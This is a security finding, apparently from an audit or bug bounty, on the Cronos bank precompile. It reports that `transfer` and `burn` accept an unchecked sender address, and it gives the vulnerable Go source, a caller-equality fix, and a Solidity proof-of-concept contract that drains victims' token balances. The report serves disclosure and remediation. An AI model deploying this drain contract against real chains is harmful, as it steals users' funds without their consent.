### Title
Bank Precompile `transfer` Method Missing Caller Authorization Allows Unauthorized Drain of Any Account's `evm/<contract>` Native Tokens - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address from call arguments without verifying it matches `contract.Caller()`. Any EVM contract can therefore call `bank.transfer(victim, attacker, amount)` to move `evm/<callerContract>` native tokens out of any account without the token holder's consent.

### Finding Description
In `BankContract.Run()`, the `TransferMethodName` branch unpacks the `sender` address directly from ABI-encoded call data (`args[0]`) and passes it as the `from` account to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)          // arbitrary, caller-supplied
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())        // "evm/<callerAddress>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no guard of the form `sender == contract.Caller()`. The denom is correctly scoped to the calling contract (`evm/<callerAddress>`), but the `from` account is fully attacker-controlled. Any contract can therefore drain any address's holdings of its own `evm/<contract>` denom.

The same pattern exists in the `burn` branch, where `args[0]` (the address to burn from) is also never checked against `contract.Caller()`:

```go
recipient := args[0].(common.Address)   // arbitrary
...
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
```

The intended usage shown in `TestBank.sol` always passes `msg.sender` as the first argument, but the precompile itself enforces nothing. [1](#0-0) [2](#0-1) 

### Impact Explanation
`evm/<contract>` tokens are native Cosmos SDK coins managed exclusively through the bank precompile — they are precompile-controlled assets. An unprivileged attacker who controls a contract at address `A` can call `bank.transfer(victim, attacker, amount)` to move `evm/A` tokens from any victim to themselves without the victim's authorization. This satisfies the Critical impact class: **unauthorized transfer of precompile-controlled assets**.

### Likelihood Explanation
For the drain to succeed the victim must hold `evm/A` tokens. A realistic attack path is:

1. Attacker deploys contract `A` and advertises it as a yield-bearing or DeFi token.
2. Users receive `evm/A` tokens (via `bank.mint` calls from contract `A`, airdrops, or secondary transfers).
3. At any later time the attacker calls `bank.transfer(user, attacker, balance)` from contract `A`, draining every holder's balance in a single transaction per victim.

Because the attacker controls the contract that issued the token, they can execute the drain at will after users have accumulated balances. No leaked keys, governance access, or cryptographic break is required.

### Recommendation
Add a caller-equality guard at the top of the `TransferMethodName` and `BurnMethodName` branches:

```go
// transfer
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}

// burn
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the calling contract")
}
```

This restricts each contract to moving only tokens held by its own address, matching the authorization model demonstrated in `TestBank.sol`. [3](#0-2) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract DrainAttack {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: lure victims into holding evm/<this> tokens
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);          // mints evm/<DrainAttack> to victim
    }

    // Step 2: drain without victim's consent
    function drain(address victim, uint256 amount) external {
        // sender arg = victim (arbitrary, not checked against msg.sender)
        bank.transfer(victim, msg.sender, amount);
    }
}
```

`drain()` succeeds because `BankContract.Run()` uses `args[0]` (the victim address) as `from` without verifying it equals `contract.Caller()` (the `DrainAttack` contract address). The victim's `evm/<DrainAttack>` balance is transferred to the attacker with no authorization from the victim. [4](#0-3) [5](#0-4)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-155)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/events/bindings/src/Bank.sol (L1-9)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```
